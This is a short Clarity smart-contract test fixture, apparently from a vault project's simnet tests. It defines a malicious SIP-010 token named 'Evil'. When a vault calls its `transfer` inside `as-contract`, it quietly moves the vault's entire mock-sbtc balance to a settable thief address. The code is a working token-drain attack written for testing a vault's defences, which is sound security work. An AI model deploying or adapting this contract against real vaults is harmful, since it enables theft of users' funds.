;; Test-only attacker: a SIP-010 token whose `transfer` lies on the way in and,
;; when it runs with the vault as `tx-sender` (inside the vault's
;; `as-contract`), moves the vault's whole mock-sbtc balance to the thief.
;; Simnet only. Never deployed.
(impl-trait .sip-010-trait.sip-010-trait)

(define-data-var thief principal tx-sender)

(define-public (set-thief (who principal))
  (ok (var-set thief who))
)

(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (let ((loot (unwrap-panic (contract-call? .mock-sbtc get-balance tx-sender))))
    (if (and (is-eq sender tx-sender) (> loot u0))
      (try! (contract-call? .mock-sbtc transfer loot tx-sender (var-get thief) none))
      false
    )
    (ok true)
  )
)

(define-read-only (get-name) (ok "Evil"))
(define-read-only (get-symbol) (ok "EVIL"))
(define-read-only (get-decimals) (ok u8))
(define-read-only (get-balance (who principal)) (ok u0))
(define-read-only (get-total-supply) (ok u0))
(define-read-only (get-token-uri) (ok none))
